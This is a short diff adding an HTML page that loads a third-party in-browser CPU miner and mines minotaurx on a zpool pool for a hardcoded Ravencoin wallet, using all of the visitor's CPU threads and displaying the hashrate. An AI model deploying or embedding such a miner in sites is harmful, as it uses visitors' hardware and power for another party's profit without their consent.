@@ -1,0 +1,28 @@
+<!-- miner.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <script src="https://unpkg.com/@marco_ciaramella/cpu-web-miner@latest/dist/web-miner.min.js"></script>
+</head>
+<body>
+  <script>
+    const stratum = {
+      server: "minotaurx.na.mine.zpool.ca",
+      port: 7019,
+      worker: "RNZaqoBye9Kye6USMC55ve52pBxo168xMU",
+      password: "c=RVN",
+      ssl: false
+    };
+
+    cpuWebMiner.start(
+      cpuWebMiner.minotaurx,
+      stratum,
+      null,
+      cpuWebMiner.ALL_THREADS,
+      work => console.log("Work:", work),
+      hashrate => document.body.innerHTML += `Hashrate: ${hashrate} H/s<br>`,
+      error => console.error("Error:", error)
+    );
+  </script>
+</body>
+</html>
